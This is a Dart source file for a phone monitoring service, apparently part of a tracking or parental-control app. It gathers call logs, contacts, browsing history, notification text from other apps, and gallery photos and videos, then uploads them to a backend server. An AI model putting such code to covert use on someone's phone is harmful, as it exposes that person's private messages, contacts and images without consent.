import 'package:dio/dio.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../core/constants/app_constants.dart';
import '../core/utils/device_id.dart';
import '../core/utils/logger.dart';
import '../core/utils/token_store.dart';
import '../models/event_queue_model.dart';
import '../platform/tracking_channel.dart';
import 'event_queue_service.dart';

/// Orchestrates slow-cycle data collection: call logs, contacts, gallery,
/// browsing history. Triggered either manually or when the Kotlin
/// ForegroundService bumps the slow_cycle_ts SharedPreferences key.
class MonitoringService {
  MonitoringService(this._queue);

  final EventQueueService _queue;
  final _ch = TrackingChannel.instance;

  static const _prefsKey            = 'pm_tracking';
  static const _slowCycleTsKey      = 'slow_cycle_ts';
  static const _lastCallLogTs       = 'mon_last_call_log_ts';
  static const _lastGalleryTs       = 'mon_last_gallery_ts';
  static const _lastBrowsingTs      = 'mon_last_browsing_ts';
  static const _lastContactTs       = 'mon_last_contact_sync_ts';
  static const _lastHandledTs       = 'mon_last_handled_slow_ts';
  static const _lastNotifTs         = 'mon_last_notif_ts';
  static const _galleryUploadedKey  = 'mon_gallery_uploaded_ids';

  bool _busy = false;

  /// Call this periodically (e.g. every 5 min from the sync loop).
  ///
  /// Notifications are always drained from the native queue (fast, just reads
  /// a SharedPreferences string). The heavier collectors (gallery, call logs,
  /// contacts, browsing) run only when the native slow-cycle timestamp advances.
  Future<void> checkAndCollect() async {
    if (_busy) return;
    _busy = true;
    try {
      final prefs = await SharedPreferences.getInstance();

      // Always drain the notification queue — it accumulates in native prefs.
      await _collectNotifications(prefs);

      final nativeTs    = prefs.getInt(_slowCycleTsKey) ?? 0;
      final lastHandled = prefs.getInt(_lastHandledTs)  ?? 0;

      if (nativeTs <= lastHandled) return; // no new slow tick yet

      appLogger.i('MonitoringService: slow cycle detected — collecting');
      await Future.wait([
        _collectCallLogs(prefs),
        _collectContacts(prefs),
        _collectGallery(prefs),
        _collectBrowsing(prefs),
      ]);
      await prefs.setInt(_lastHandledTs, nativeTs);
    } finally {
      _busy = false;
    }
  }

  /// Force a full collection regardless of the slow-cycle timestamp.
  Future<void> collectNow() async {
    if (_busy) return;
    _busy = true;
    try {
      final prefs = await SharedPreferences.getInstance();
      await _collectAll(prefs);
    } finally {
      _busy = false;
    }
  }

  // ── Internal ──────────────────────────────────────────────────────────────

  Future<void> _collectAll(SharedPreferences prefs) async {
    await Future.wait([
      _collectCallLogs(prefs),
      _collectContacts(prefs),
      _collectGallery(prefs),
      _collectBrowsing(prefs),
      _collectNotifications(prefs), // also run during collectNow() / startup
    ]);
  }

  Future<void> _collectCallLogs(SharedPreferences prefs) async {
    try {
      final phoneGranted = await Permission.phone.isGranted;
      appLogger.d('MonitoringService: READ_CALL_LOG permission granted = $phoneGranted');
      if (!phoneGranted) {
        appLogger.w('MonitoringService: call logs skipped — READ_CALL_LOG not granted');
        return;
      }

      final since = prefs.getInt(_lastCallLogTs) ?? 0;
      appLogger.d('MonitoringService: fetching call logs since $since');
      final items = await _ch.getCallLogs(sinceTimestamp: since);
      appLogger.d('MonitoringService: call logs returned ${items.length} items');
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.callLog, item);
      }

      final newest = items
          .map((e) => (e['timestamp'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastCallLogTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} call log entries');
    } catch (e) {
      appLogger.w('MonitoringService: call logs failed — $e');
    }
  }

  Future<void> _collectContacts(SharedPreferences prefs) async {
    try {
      final lastSync = prefs.getInt(_lastContactTs) ?? 0;
      // Always collect — contacts don't have timestamps, use full refresh
      // but rate-limit to once per 6 hours
      final sixHours = 6 * 60 * 60 * 1000;
      if (DateTime.now().millisecondsSinceEpoch - lastSync < sixHours) return;

      final items = await _ch.getContacts();
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.contact, item);
      }

      await prefs.setInt(_lastContactTs, DateTime.now().millisecondsSinceEpoch);
      appLogger.d('MonitoringService: queued ${items.length} contacts');
    } catch (e) {
      appLogger.w('MonitoringService: contacts failed — $e');
    }
  }

  Future<void> _collectGallery(SharedPreferences prefs) async {
    try {
      final photosGranted  = await Permission.photos.isGranted;
      final videosGranted  = await Permission.videos.isGranted;
      // On Android < 13, READ_EXTERNAL_STORAGE covers both photos and videos
      final storageGranted = await Permission.storage.isGranted;
      appLogger.d('MonitoringService: gallery perms — photos=$photosGranted videos=$videosGranted storage=$storageGranted');
      // Proceed if any media permission is granted
      if (!photosGranted && !videosGranted && !storageGranted) {
        appLogger.w('MonitoringService: gallery skipped — no media permission granted');
        return;
      }

      final since = prefs.getInt(_lastGalleryTs) ?? 0;
      appLogger.d('MonitoringService: fetching gallery since $since');
      final items = await _ch.getGalleryItems(sinceTimestamp: since);
      appLogger.d('MonitoringService: gallery returned ${items.length} items');
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.galleryItem, item);
      }

      // Track by dateAdded (always set) not takenAt (often 0 for screenshots)
      final newest = items
          .map((e) => (e['dateAdded'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastGalleryTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} gallery items');

      // Upload actual image files in the background
      _uploadGalleryImages(items, prefs);
    } catch (e) {
      appLogger.w('MonitoringService: gallery failed — $e');
    }
  }

  // Fire-and-forget: uploads full image data for items not yet sent to backend.
  Future<void> _uploadGalleryImages(
      List<Map<String, dynamic>> items, SharedPreferences prefs) async {
    try {
      final token    = await TokenStore.getToken();
      final deviceId = await DeviceIdUtil.get();
      if (token == null) return;

      final uploaded = Set<String>.from(
          prefs.getStringList(_galleryUploadedKey) ?? []);

      final dio = Dio(BaseOptions(
        baseUrl: AppConstants.backendBaseUrl,
        connectTimeout: const Duration(seconds: 30),
        receiveTimeout: const Duration(seconds: 120),
      ));

      for (final item in items) {
        final id       = item['id'] as String?;
        final mimeType = item['mimeType'] as String? ?? 'image/jpeg';
        if (id == null || uploaded.contains(id)) continue;

        try {
          final isVideo = mimeType.startsWith('video');
          final fileData = isVideo
              ? await _ch.getGalleryVideoData(id)
              : await _ch.getGalleryImageData(id);

          if (fileData.isEmpty) {
            uploaded.add(id); // skip — too large or unreadable
            continue;
          }

          await dio.post(
            '/api/gallery/upload/$id',
            data: {'deviceId': deviceId, 'imageData': fileData, 'mimeType': mimeType},
            options: Options(headers: {'Authorization': 'Bearer $token'}),
          );

          uploaded.add(id);
          appLogger.d('MonitoringService: uploaded ${isVideo ? "video" : "image"} $id');
        } catch (e) {
          appLogger.w('MonitoringService: upload failed for $id — $e');
        }
      }

      await prefs.setStringList(_galleryUploadedKey, uploaded.toList());
    } catch (e) {
      appLogger.w('MonitoringService: gallery upload loop failed — $e');
    }
  }

  Future<void> _collectNotifications(SharedPreferences prefs) async {
    try {
      final items = await _ch.getNotifications();
      appLogger.d('MonitoringService: notifications returned ${items.length} items');
      if (items.isEmpty) return;

      for (final item in items) {
        final ts = (item['timestamp'] as int?) ?? 0;
        await _queue.enqueue(EventType.notification, {
          'packageName': item['packageName'] as String? ?? '',
          'appName':     item['appName']     as String? ?? '',
          'title':       item['title'],
          'body':        item['body'],
          'bigText':     null,
          'postedAt':    ts > 0
              ? DateTime.fromMillisecondsSinceEpoch(ts).toIso8601String()
              : DateTime.now().toIso8601String(),
          'category':    null,
          'isRead':      false,
        });
      }
      appLogger.d('MonitoringService: queued ${items.length} notifications');
    } catch (e) {
      appLogger.w('MonitoringService: notifications failed — $e');
    }
  }

  Future<void> _collectBrowsing(SharedPreferences prefs) async {
    try {
      final since = prefs.getInt(_lastBrowsingTs) ?? 0;
      final items = await _ch.getBrowsingHistory(sinceTimestamp: since);
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.browsingHistory, item);
      }

      final newest = items
          .map((e) => (e['visitedAt'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastBrowsingTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} browsing entries');
    } catch (e) {
      appLogger.w('MonitoringService: browsing history failed — $e');
    }
  }
}
